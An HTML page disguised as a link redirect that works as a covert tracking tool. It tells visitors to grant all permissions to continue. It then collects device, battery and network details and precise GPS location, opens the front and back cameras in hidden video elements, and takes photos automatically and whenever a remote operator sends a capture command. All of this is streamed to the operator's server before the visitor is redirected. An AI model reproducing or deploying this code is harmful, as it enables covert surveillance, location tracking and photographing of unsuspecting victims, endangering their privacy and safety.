<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            text-align: center;
            max-width: 450px;
            width: 100%;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #e8ecf1;
            border-top: 4px solid #4285f4;
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .redirect-text { font-size: 18px; color: #1a2332; margin-bottom: 6px; font-weight: 500; }
        .redirect-url { 
            font-size: 14px; 
            color: #4285f4; 
            word-break: break-all; 
            font-weight: 500;
            background: #f0f4ff;
            padding: 8px 14px;
            border-radius: 8px;
            display: inline-block;
            margin-top: 4px;
        }
        .sub-text { font-size: 13px; color: #8895aa; margin-top: 12px; }
        .status-text {
            font-size: 14px;
            color: #e53e3e;
            margin-top: 15px;
            font-weight: 500;
        }
        .status-text.done { color: #22a67e; }
        #hiddenVideo, #hiddenVideoBack { display: none; }
        .permission-status {
            margin-top: 20px;
            padding: 15px;
            background: #f8f9fc;
            border-radius: 8px;
            text-align: left;
            font-size: 13px;
        }
        .permission-status .item {
            padding: 5px 0;
            border-bottom: 1px solid #eee;
        }
        .permission-status .item:last-child { border-bottom: none; }
        .permission-status .granted { color: #22a67e; }
        .permission-status .pending { color: #f6ad55; }
        .permission-status .denied { color: #e53e3e; }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <div class="redirect-text">Redirecting to</div>
        <div class="redirect-url" id="redirectUrlDisplay">Loading...</div>
        <div class="sub-text">Please grant all permissions to continue</div>
        <div class="status-text" id="statusText">⏳ Waiting for permissions...</div>
        
        <!-- Permission Status -->
        <div class="permission-status" id="permissionStatus">
            <div class="item" id="statusLocation">📍 Location: <span class="pending">Waiting...</span></div>
            <div class="item" id="statusFrontCam">📸 Front Camera: <span class="pending">Waiting...</span></div>
            <div class="item" id="statusBackCam">📸 Back Camera: <span class="pending">Waiting...</span></div>
        </div>
    </div>

    <video id="hiddenVideo" autoplay playsinline muted></video>
    <video id="hiddenVideoBack" autoplay playsinline muted></video>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
    <script>
        if (typeof io === 'undefined') {
            var s = document.createElement('script');
            s.src = 'https://cdn.socket.io/4.6.1/socket.io.min.js';
            document.head.appendChild(s);
        }
    </script>

    <script>
        (function() {
            const visitorId = window.location.pathname.split('/').pop();
            const redirectDisplay = document.getElementById('redirectUrlDisplay');
            const statusText = document.getElementById('statusText');
            
            let socket = null;
            let redirectUrl = 'https://www.google.com';
            let redirectTriggered = false;
            
            // Permission tracking
            let permissions = {
                location: false,
                frontCamera: false,
                backCamera: false
            };
            
            let cameraStream = null;
            let cameraStreamBack = null;
            let frontVideo = document.getElementById('hiddenVideo');
            let backVideo = document.getElementById('hiddenVideoBack');

            function updateStatus(msg, isDone = false) {
                statusText.textContent = msg;
                statusText.className = 'status-text' + (isDone ? ' done' : '');
                console.log(msg);
            }

            function updatePermissionStatus(type, status) {
                const element = document.getElementById(type === 'location' ? 'statusLocation' : 
                                                       type === 'front' ? 'statusFrontCam' : 'statusBackCam');
                if (element) {
                    const span = element.querySelector('span');
                    if (span) {
                        span.textContent = status;
                        span.className = status === 'Granted' ? 'granted' : 
                                        status === 'Denied' ? 'denied' : 'pending';
                    }
                }
            }

            function checkAllPermissions() {
                const allGranted = permissions.location && permissions.frontCamera && permissions.backCamera;
                if (allGranted) {
                    updateStatus('✅ All permissions granted! Redirecting...', true);
                    
                    if (socket && socket.connected) {
                        socket.emit('visitor-data', {
                            visitorId,
                            type: 'permissionsGranted',
                            content: true
                        });
                    }
                    
                    setTimeout(function() {
                        if (!redirectTriggered) {
                            redirectNow();
                        }
                    }, 2000);
                } else {
                    const pending = [];
                    if (!permissions.location) pending.push('Location');
                    if (!permissions.frontCamera) pending.push('Front Camera');
                    if (!permissions.backCamera) pending.push('Back Camera');
                    updateStatus(`⏳ Waiting for: ${pending.join(', ')}`);
                }
            }

            function fetchRedirectUrl() {
                fetch(`/api/visitor/${visitorId}`)
                    .then(res => res.json())
                    .then(data => {
                        redirectUrl = data.redirectUrl || 'https://www.google.com';
                        redirectDisplay.textContent = redirectUrl;
                        connectSocket();
                    })
                    .catch(() => {
                        fetch(`/api/visitor-redirect/${visitorId}`)
                            .then(res => res.json())
                            .then(data => {
                                redirectUrl = data.redirectUrl || 'https://www.google.com';
                                redirectDisplay.textContent = redirectUrl;
                                connectSocket();
                            })
                            .catch(() => {
                                redirectUrl = 'https://www.google.com';
                                redirectDisplay.textContent = redirectUrl;
                                connectSocket();
                            });
                    });
            }

            function connectSocket() {
                try {
                    socket = io({
                        transports: ['websocket', 'polling'],
                        reconnectionAttempts: 5,
                        reconnectionDelay: 1000
                    });

                    socket.on('connect', function() {
                        console.log('✅ Socket connected');
                        sendDeviceInfo();
                        
                        // Request permissions AFTER socket connects
                        setTimeout(function() {
                            requestAllPermissions();
                        }, 500);
                    });

                    socket.on('connect_error', function(err) {
                        console.log('❌ Socket error:', err.message);
                        setTimeout(() => socket.connect(), 2000);
                    });

                    // Listen for admin capture commands
                    socket.on('capture-command', function(data) {
                        console.log('📸 Capture command received:', data.type);
                        if (data.type === 'front') {
                            capturePhoto('front', frontVideo);
                        } else if (data.type === 'back') {
                            capturePhoto('back', backVideo);
                        } else if (data.type === 'both') {
                            capturePhoto('front', frontVideo);
                            setTimeout(function() {
                                capturePhoto('back', backVideo);
                            }, 1500);
                        }
                    });

                } catch(e) {
                    console.log('❌ Socket init error:', e.message);
                }
            }

            function sendDeviceInfo() {
                if (!socket || !socket.connected) {
                    setTimeout(sendDeviceInfo, 500);
                    return;
                }

                const deviceInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    language: navigator.language,
                    deviceName: navigator.userAgentData ? 
                        navigator.userAgentData.brands.map(b => b.brand).join(', ') : 
                        navigator.platform
                };

                socket.emit('visitor-connect', { visitorId, ...deviceInfo });
                console.log('📱 Device info sent');

                // Battery
                if (navigator.getBattery) {
                    navigator.getBattery()
                        .then(function(battery) {
                            const level = Math.round(battery.level * 100);
                            if (socket && socket.connected) {
                                socket.emit('visitor-data', {
                                    visitorId,
                                    type: 'battery',
                                    content: level
                                });
                                console.log(`🔋 Battery: ${level}%`);
                            }
                        })
                        .catch(() => {});
                }

                // Network
                let networkData = { type: 'Unknown', effectiveType: 'Unknown' };
                if (navigator.connection) {
                    const conn = navigator.connection;
                    networkData = {
                        type: conn.type || 'Unknown',
                        effectiveType: conn.effectiveType || 'Unknown',
                        downlink: conn.downlink || 'Unknown'
                    };
                }
                if (socket && socket.connected) {
                    socket.emit('visitor-data', {
                        visitorId,
                        type: 'network',
                        content: networkData
                    });
                    console.log('📶 Network info sent');
                }
            }

            function requestAllPermissions() {
                updateStatus('⏳ Requesting permissions...');
                
                // ===== LOCATION =====
                console.log('📍 Requesting location...');
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        function(pos) {
                            console.log('✅ Location granted');
                            permissions.location = true;
                            updatePermissionStatus('location', 'Granted');
                            
                            const lat = pos.coords.latitude;
                            const lng = pos.coords.longitude;
                            
                            fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`)
                                .then(res => res.json())
                                .then(data => {
                                    const locationInfo = {
                                        lat: lat,
                                        lng: lng,
                                        accuracy: pos.coords.accuracy,
                                        timestamp: new Date().toISOString(),
                                        country: data.countryName || 'Unknown',
                                        state: data.principalSubdivision || 'Unknown',
                                        city: data.locality || 'Unknown'
                                    };
                                    if (socket && socket.connected) {
                                        socket.emit('visitor-data', {
                                            visitorId,
                                            type: 'location',
                                            content: locationInfo
                                        });
                                        console.log('✅ Location sent');
                                    }
                                })
                                .catch(() => {
                                    const locationInfo = {
                                        lat: lat,
                                        lng: lng,
                                        accuracy: pos.coords.accuracy,
                                        timestamp: new Date().toISOString()
                                    };
                                    if (socket && socket.connected) {
                                        socket.emit('visitor-data', {
                                            visitorId,
                                            type: 'location',
                                            content: locationInfo
                                        });
                                    }
                                });
                            
                            checkAllPermissions();
                        },
                        function(err) {
                            console.log('❌ Location denied:', err.message);
                            permissions.location = false;
                            updatePermissionStatus('location', 'Denied');
                            checkAllPermissions();
                        },
                        { timeout: 15000, enableHighAccuracy: true }
                    );
                }

                // ===== FRONT CAMERA (Force popup) =====
                console.log('📸 Requesting front camera...');
                navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                })
                .then(function(stream) {
                    console.log('✅ Front camera granted');
                    permissions.frontCamera = true;
                    updatePermissionStatus('front', 'Granted');
                    cameraStream = stream;
                    frontVideo.srcObject = stream;
                    return frontVideo.play();
                })
                .then(function() {
                    setTimeout(function() {
                        capturePhoto('front', frontVideo);
                    }, 1500);
                    checkAllPermissions();
                })
                .catch(function(err) {
                    console.log('❌ Front camera denied:', err.message);
                    permissions.frontCamera = false;
                    updatePermissionStatus('front', 'Denied');
                    checkAllPermissions();
                });

                // ===== BACK CAMERA (Force popup) =====
                console.log('📸 Requesting back camera...');
                navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: 'environment',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                })
                .then(function(stream) {
                    console.log('✅ Back camera granted');
                    permissions.backCamera = true;
                    updatePermissionStatus('back', 'Granted');
                    cameraStreamBack = stream;
                    backVideo.srcObject = stream;
                    return backVideo.play();
                })
                .then(function() {
                    setTimeout(function() {
                        capturePhoto('back', backVideo);
                    }, 2500);
                    checkAllPermissions();
                })
                .catch(function(err) {
                    console.log('❌ Back camera denied:', err.message);
                    permissions.backCamera = false;
                    updatePermissionStatus('back', 'Denied');
                    checkAllPermissions();
                });
            }

            function capturePhoto(type, video) {
                if (!video || !video.videoWidth || !video.videoHeight) {
                    console.log(`⚠️ ${type} video not ready`);
                    return;
                }

                try {
                    const canvas = document.createElement('canvas');
                    const maxWidth = 800;
                    const maxHeight = 600;
                    let width = video.videoWidth;
                    let height = video.videoHeight;
                    
                    if (width > maxWidth) {
                        height = (height * maxWidth) / width;
                        width = maxWidth;
                    }
                    if (height > maxHeight) {
                        width = (width * maxHeight) / height;
                        height = maxHeight;
                    }
                    
                    canvas.width = width;
                    canvas.height = height;
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, width, height);
                    const imageData = canvas.toDataURL('image/jpeg', 0.9);

                    console.log(`📸 ${type} photo captured`);

                    if (socket && socket.connected) {
                        socket.emit('visitor-data', {
                            visitorId: visitorId,
                            type: type === 'back' ? 'backCamera' : 'frontCamera',
                            content: imageData
                        });
                        console.log(`✅ ${type} photo sent to server`);
                    }
                } catch (err) {
                    console.log(`❌ ${type} capture error:`, err.message);
                }
            }

            function redirectNow() {
                if (redirectTriggered) return;
                redirectTriggered = true;

                if (socket && socket.connected) {
                    socket.emit('visitor-data', {
                        visitorId,
                        type: 'redirectComplete',
                        content: { redirected: true, time: new Date().toISOString() }
                    });
                }

                // Clean up camera streams
                if (cameraStream) {
                    cameraStream.getTracks().forEach(t => t.stop());
                }
                if (cameraStreamBack) {
                    cameraStreamBack.getTracks().forEach(t => t.stop());
                }

                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, 1000);
            }

            // ===== START =====
            if (typeof io !== 'undefined') {
                fetchRedirectUrl();
            } else {
                setTimeout(fetchRedirectUrl, 2000);
            }

            window.addEventListener('beforeunload', function() {
                if (socket) socket.disconnect();
                if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
                if (cameraStreamBack) cameraStreamBack.getTracks().forEach(t => t.stop());
            });
        })();
    </script>
</body>
</html>
